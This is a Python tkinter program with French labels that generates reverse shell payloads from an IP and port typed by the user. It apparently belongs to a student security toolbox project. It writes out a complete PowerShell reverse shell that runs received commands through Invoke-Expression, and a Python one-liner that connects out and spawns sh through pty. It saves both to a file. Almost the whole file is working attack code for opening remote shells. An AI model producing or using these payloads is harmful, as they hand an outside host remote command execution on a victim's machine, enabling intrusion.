import tkinter as tk
from tkinter import messagebox
import subprocess
import os

def generate_reverse_shell_code_powershell():
    ip = ip_entry.get()
    port = port_entry.get()

    if not ip or not port:
        messagebox.showerror("Erreur de saisie", "Veuillez entrer à la fois l'IP et le Port")
        return

    try:
        port = int(port)
    except ValueError:
        messagebox.showerror("Erreur de saisie", "Le port doit être un nombre")
        return

    # Génération du code de reverse shell PowerShell avec les informations fournies
    reverse_shell_code = (
        f"$LHOST = \"{ip}\"\n"
        f"$LPORT = {port}\n"
        f"$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)\n"
        f"$NetworkStream = $TCPClient.GetStream()\n"
        f"$StreamReader = New-Object IO.StreamReader($NetworkStream)\n"
        f"$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\n"
        f"$StreamWriter.AutoFlush = $true\n"
        f"$Buffer = New-Object System.Byte[] 1024\n\n"
        f"$StreamWriter.Write(\"[*] Connected to $LHOST`n\")\n\n"
        f"try {{\n"
        f"    while ($TCPClient.Connected) {{\n"
        f"        if ($NetworkStream.DataAvailable) {{\n"
        f"            $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)\n"
        f"            if ($RawData -gt 0) {{\n"
        f"                $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData).Trim()\n"
        f"                $StreamWriter.Write(\"[PS] C:\\> $Command`n\")\n"
        f"                try {{\n"
        f"                    $Output = Invoke-Expression $Command 2>&1 | Out-String\n"
        f"                    $StreamWriter.Write(\"$Output`n\")\n"
        f"                }} catch {{\n"
        f"                    $StreamWriter.Write(\"Error: $_`n\")\n"
        f"                }}\n"
        f"            }}\n"
        f"        }}\n"
        f"        Start-Sleep -Milliseconds 100\n"
        f"    }}\n"
        f"}} finally {{\n"
        f"    $StreamWriter.Write(\"[*] Disconnected`n\")\n"
        f"    $StreamReader.Close()\n"
        f"    $StreamWriter.Close()\n"
        f"    $NetworkStream.Close()\n"
        f"    $TCPClient.Close()\n"
        f"}}"
    )

    # Chemin du fichier de sortie pour Windows et Linux
    output_path = "C:\\Users\\ishak\\Documents\\ESI-2023-2024\\Projet-Tool-Box\\result-reverse\\reverse_shell_code.txt"

    try:
        with open(output_path, "w") as file:
            file.write(reverse_shell_code)
        messagebox.showinfo("Succès", f"Le code de reverse shell PowerShell a été enregistré dans {output_path}")
        if messagebox.askyesno("Ouvrir le fichier", "Voulez-vous ouvrir le fichier ?"):
            os.startfile(output_path)
    except Exception as e:
        messagebox.showerror("Erreur de fichier", f"Une erreur est survenue lors de l'enregistrement du fichier : {e}")

def generate_reverse_shell_code_kali():
    ip = ip_entry.get()
    port = port_entry.get()

    if not ip or not port:
        messagebox.showerror("Erreur de saisie", "Veuillez entrer à la fois l'IP et le Port")
        return

    try:
        port = int(port)
    except ValueError:
        messagebox.showerror("Erreur de saisie", "Le port doit être un nombre")
        return

    # Génération du code de reverse shell avec les informations fournies
    reverse_shell_code = (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);import pty;pty.spawn(\"sh\")'"
    )

    # Chemin du fichier de sortie pour Windows et  Linux
    output_path = "C:\\Users\\ishak\\Documents\\ESI-2023-2024\\Projet-Tool-Box\\result-reverse\\reverse_shell_code.txt"

    try:
        with open(output_path, "w") as file:
            file.write(reverse_shell_code)
        messagebox.showinfo("Succès", f"Le code de reverse shell Python a été enregistré dans {output_path}")
        if messagebox.askyesno("Ouvrir le fichier", "Voulez-vous ouvrir le fichier ?"):
            os.startfile(output_path)
    except Exception as e:
        messagebox.showerror("Erreur de fichier", f"Une erreur est survenue lors de l'enregistrement du fichier : {e}")

# Création de la fenêtre principale
root = tk.Tk()
root.title("Générateur de Code de Reverse Shell")
root.configure(bg="blue")

# Champ pour l'adresse IP
tk.Label(root, text="IP :", bg="blue", fg="white").grid(row=0, column=0, padx=10, pady=10)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=10, pady=10)

# Champ pour le port
tk.Label(root, text="Port :", bg="blue", fg="white").grid(row=1, column=0, padx=10, pady=10)
port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1, padx=10, pady=10)

# Bouton pour générer le code de reverse shell PowerShell pour Windows
generate_button_powershell = tk.Button(root, text="Générer le Code (PowerShell)", command=generate_reverse_shell_code_powershell, bg="white", fg="black")
generate_button_powershell.grid(row=2, column=0, columnspan=2, pady=10)

# Bouton pour générer le code de reverse shell Python pour Linux
generate_button_kali = tk.Button(root, text="Générer le Code (Python3)", command=generate_reverse_shell_code_kali, bg="white", fg="black")
generate_button_kali.grid(row=3, column=0, columnspan=2, pady=10)

# Exécution de la boucle principale Tkinter
root.mainloop()
